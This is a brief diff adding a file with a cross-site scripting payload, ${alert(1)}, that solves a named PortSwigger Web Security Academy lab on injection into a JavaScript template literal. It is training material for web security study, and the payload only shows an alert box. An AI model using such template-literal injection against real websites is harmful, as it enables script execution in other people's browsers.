@@ -1,0 +1,4 @@
+The payload below is meant to solve the following lab:
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped
+
+${alert(1)}
